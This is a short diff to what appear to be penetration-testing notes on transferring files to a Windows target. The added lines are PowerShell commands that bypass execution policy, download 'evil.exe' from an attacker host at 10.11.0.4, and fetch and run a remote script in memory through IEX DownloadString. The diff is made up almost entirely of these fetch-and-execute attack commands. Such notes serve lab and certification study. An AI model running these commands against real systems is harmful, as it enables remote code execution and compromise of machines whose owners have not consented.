@@ -5,6 +5,14 @@ https://www.file.io/
 ```
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')" 
 powershell -NoProfile -ExecutionPolicy Bypass -NoLogo -NonInteractive -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+d_f.ps1
+$webclient = New-Object System.Net.WebClient
+$url = "http://10.11.0.4/evil.exe"
+$file = "new-exploit.exe"
+$webclient.DownloadFile($url,$file)
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/d_f.ps1')
 ```
 
 ### SCP Copy file from remote machine to local tmp
